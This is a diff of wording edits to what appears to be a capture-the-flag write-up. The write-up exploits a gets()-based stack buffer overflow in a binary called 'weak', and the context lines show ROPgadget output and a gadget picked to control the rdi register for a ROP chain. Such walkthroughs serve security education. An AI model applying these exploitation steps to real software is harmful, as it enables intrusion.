@@ -18,7 +18,7 @@ As we can see from the man page the gets(*s) function will read until \n or EOF,
 
 ![alt text](images/man_gets.png)
 
-Reading the vuln function we can see that the argument for the gets function will be a variable located into the stack.
+By reading the vuln function we can see that the argument for the gets function will be a variable located into the stack.
 So what we expect from this is a stack-buffer overflow.
 Let's verify this:
 
@@ -80,7 +80,7 @@ $ ROPgadget --binary ./weak --depth 40 |grep pop|grep ret
 0x0000000000400518 : sti ; add al, 0x20 ; add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
 0x000000000040050d : syscall ; and byte ptr [rax], al ; cmp rax, rbx ; jb 0x40050e ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
 ```
-Then i start to search for more complicated gadgets that chained together they will make me get control over rdi register.
+Then i start to search for more complicated gadgets that chained together they will make me get control over rdi register (at least).
 The first gadget that i picked was this one:
 ```
 0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
